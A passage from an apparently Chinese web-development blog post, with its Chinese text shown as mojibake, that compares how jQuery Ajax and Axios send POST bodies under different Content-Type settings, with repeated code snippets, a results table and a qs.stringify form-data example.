class="hljs-comment">//é”å®šæµè§ˆå™¨ï¼Œåªæœ‰è¯·æ±‚å¤„ç†å®Œæ¯•ä¹‹åï¼ˆå›è°ƒå‡½æ•°è°ƒç”¨å®Œæˆä¹‹åï¼‰ï¼Œæ‰èƒ½æ‰§è¡Œåé¢çš„ä»£ç </span><br>               <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                   <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>               &#125;,<br>               <span class="hljs-attr">error</span>: &#123;&#125;<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213220754987.png" alt="image-20221213220754987" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213220807735.png" alt="image-20221213220807735" /></p><h2 id="axios"><a class="markdownIt-Anchor" href="#axios"></a> Axios</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>           <span class="hljs-title function_">axios</span>(&#123;<br>               <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>               <span class="hljs-comment">/* headers: &#123;</span><br><span class="hljs-comment">                   &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;</span><br><span class="hljs-comment">               &#125;, */</span><br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>               &#125;)<br>           &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>               <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221558251.png" alt="image-20221213221558251" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221607686.png" alt="image-20221213221607686" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>            <span class="hljs-title function_">axios</span>(&#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>                <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span>,<br>                <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>                &#125;),<br>                <br>            &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>                <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><blockquote><p><strong>Axios:</strong></p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213222323951.png" alt="image-20221213222323951" /></p><blockquote><p><strong>Ajax:</strong></p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213222545937.png" alt="image-20221213222545937" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221558251.png" alt="image-20221213221558251" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221607686.png" alt="image-20221213221607686" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>            <span class="hljs-title function_">axios</span>(&#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>                <span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>                &#125;,<br>                <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>                &#125;)<br>            &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>                <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213222249241.png" alt="image-20221213222249241" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221406905.png" alt="image-20221213221406905" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221415247.png" alt="image-20221213221415247" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>           <span class="hljs-title function_">axios</span>(&#123;<br>               <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>               <span class="hljs-attr">headers</span>: &#123;<br>                   <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>               &#125;,<br>               <span class="hljs-attr">data</span>:&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test3&quot;</span><br>                &#125;,<br>           &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>               <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221654371.png" alt="image-20221213221654371" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221702039.png" alt="image-20221213221702039" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>          <span class="hljs-title function_">axios</span>(&#123;<br>              <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>              <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>             <span class="hljs-comment">/*  headers: &#123;</span><br><span class="hljs-comment">                  &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;</span><br><span class="hljs-comment">              &#125;, */</span><br>              <span class="hljs-attr">data</span>:&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test3&quot;</span><br>               &#125;,<br>          &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>              <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>          &#125;)<br>      &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221730556.png" alt="image-20221213221730556" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221737768.png" alt="image-20221213221737768" /></p><p><mark>contentType</mark>å¦‚ä½•è®¾ç½®</p><p>Ajax</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data))<br>            $.<span class="hljs-title function_">ajax</span>(&#123;<br>                <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>                <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>                <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>                &#125;),<br>                <span class="hljs-comment">// data:JSON.stringify(data),</span><br>                <span class="hljs-comment">/* headers: &#123;</span><br><span class="hljs-comment">                   &#x27;contentType&#x27;: &quot;application/json&quot;,</span><br><span class="hljs-comment">                &#125;, */</span><br>                <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//é”å®šæµè§ˆå™¨ï¼Œåªæœ‰è¯·æ±‚å¤„ç†å®Œæ¯•ä¹‹åï¼ˆå›è°ƒå‡½æ•°è°ƒç”¨å®Œæˆä¹‹åï¼‰ï¼Œæ‰èƒ½æ‰§è¡Œåé¢çš„ä»£ç </span><br>                <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                    <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>                &#125;,<br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225427165.png" alt="image-20221213225427165" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>               <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data))<br>           $.<span class="hljs-title function_">ajax</span>(&#123;<br>               <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>               <span class="hljs-comment">//  contentType: &quot;application/json&quot;,</span><br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>               &#125;),<br>               <span class="hljs-comment">// data:JSON.stringify(data),</span><br>               <span class="hljs-attr">headers</span>: &#123;<br>                  <span class="hljs-string">&#x27;contentType&#x27;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>               &#125;,<br>               <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//é”å®šæµè§ˆå™¨ï¼Œåªæœ‰è¯·æ±‚å¤„ç†å®Œæ¯•ä¹‹åï¼ˆå›è°ƒå‡½æ•°è°ƒç”¨å®Œæˆä¹‹åï¼‰ï¼Œæ‰èƒ½æ‰§è¡Œåé¢çš„ä»£ç </span><br>               <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                   <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>               &#125;,<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225509717.png" alt="image-20221213225509717" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>               <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data))<br>           $.<span class="hljs-title function_">ajax</span>(&#123;<br>               <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>               <span class="hljs-comment">//  contentType: &quot;application/json&quot;,</span><br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>               &#125;),<br>               <span class="hljs-comment">// data:JSON.stringify(data),</span><br>               <span class="hljs-attr">headers</span>: &#123;<br>                   <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>               &#125;,<br>               <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//é”å®šæµè§ˆå™¨ï¼Œåªæœ‰è¯·æ±‚å¤„ç†å®Œæ¯•ä¹‹åï¼ˆå›è°ƒå‡½æ•°è°ƒç”¨å®Œæˆä¹‹åï¼‰ï¼Œæ‰èƒ½æ‰§è¡Œåé¢çš„ä»£ç </span><br>               <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                   <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>               &#125;,<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225614536.png" alt="image-20221213225614536" /></p><p>Axios</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>           <span class="hljs-title function_">axios</span>(&#123;<br>               <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>               <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>               &#125;),<br>               <br>           &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>               <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225732777.png" alt="image-20221213225732777" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>            <span class="hljs-title function_">axios</span>(&#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>                <span class="hljs-comment">// contentType: &quot;application/json&quot;,</span><br>                <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>                &#125;),<br>                <span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>                    <span class="hljs-comment">// &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;</span><br>                &#125;,<br>                <br>            &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>                <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225830608.png" alt="image-20221213225830608" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>            <span class="hljs-title function_">axios</span>(&#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>                <span class="hljs-comment">// contentType: &quot;application/json&quot;,</span><br>                <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>                &#125;),<br>                <span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-comment">// contentType: &quot;application/json&quot;,</span><br>                    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>                &#125;,<br>                <br>            &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>                <span class="hljs-comment">//å¤„ç†è¿”å›æ•°æ®</span><br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225905831.png" alt="image-20221213225905831" /></p><h2 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“"></a> æ€»ç»“</h2><blockquote><p>æ³¨æ„</p></blockquote><p><strong>Ajax</strong>è®¾ç½®<code>Content-Type</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">contentType<span class="hljs-string">&#x27;: &quot;application/json&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>                &#125;,<br></code></pre></td></tr></table></figure><p><strong>Axios</strong>è®¾ç½®<code>Content-Type</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>                &#125;,<br></code></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">æ–¹å¼\æ•°æ®ç±»å‹</th><th style="text-align:center">JSONå¯¹è±¡</th><th style="text-align:center">JSONå­—ç¬¦ä¸²</th></tr></thead><tbody><tr><td style="text-align:center">Ajaxï¼ˆæœªè®¾ç½®Content-Typeï¼‰</td><td style="text-align:center">Fromdata</td><td style="text-align:center">Fromdata(è¿˜æœ‰é”™è¯¯)</td></tr><tr><td style="text-align:center">Ajaxï¼ˆè®¾ç½®Content-Typeï¼‰</td><td style="text-align:center">payload</td><td style="text-align:center">Json</td></tr><tr><td style="text-align:center">Axiosï¼ˆæœªè®¾ç½®Content-Typeï¼‰</td><td style="text-align:center">Json</td><td style="text-align:center">Fromdata(è¿˜æœ‰é”™è¯¯)</td></tr><tr><td style="text-align:center">Axiosï¼ˆè®¾ç½®Content-Typeï¼‰</td><td style="text-align:center">Json</td><td style="text-align:center">Json</td></tr></tbody></table><h2 id="axioså‘é€postè¯·æ±‚æºå¸¦fromdata"><a class="markdownIt-Anchor" href="#axioså‘é€postè¯·æ±‚æºå¸¦fromdata"></a> Axioså‘é€Postè¯·æ±‚ï¼Œæºå¸¦Fromdata</h2><p>Axiosé»˜è®¤æ˜¯å‘é€JSONæ•°æ®çš„ï¼Œæƒ³è¦å‘é€Fromdataæ•°æ®ã€‚å¯ä»¥è¿™æ ·åš</p><p>ä¸‹è½½qs.jsåˆ°æœ¬åœ°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨CDNåœ¨çº¿</p><p><a href="https://www.bootcdn.cn/">https://www.bootcdn.cn/</a></p><p>ä½¿ç”¨ <code>qs</code> ç»„ä»¶ï¼Œä½†æ˜¯ <code>qs</code> æ ¼å¼åŒ–ä¼šè¿‡æ»¤ç©ºæ•°ç»„æ•°æ®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script src=<span class="hljs-string">&quot;plugins/qs/qs.js&quot;</span>&gt;&lt;/script&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">const</span> <span class="hljs-title function_">login</span> = (<span class="hljs-params">data</span>) =&gt; &#123;</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-keyword">return</span> $axios(&#123;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/oauth/oauth/token&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;post&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">headers</span>: &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span></span></span><br><span class="language-javascript"><span class="language-xml">            &#125;,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">data</span>: <span class="hljs-title class_">Qs</span>.<span class="hljs-title function_">stringify</span>(data)</span></span><br><span class="language-javascript"><span class="language-xml">        &#125;)</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>æ ¼å¼åŒ–å‡ºæ¥çš„æ•°æ®</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// æ•°ç»„æ— å€¼</span><br>id: <span class="hljs-number">2086</span><br>intention: <br><br><span class="hljs-comment">// æ•°ç»„æœ‰å€¼</span><br>id: <span class="hljs-number">2086</span><br>intention: <br>follower_id<span class="hljs-selector-attr">[0]</span>: <span 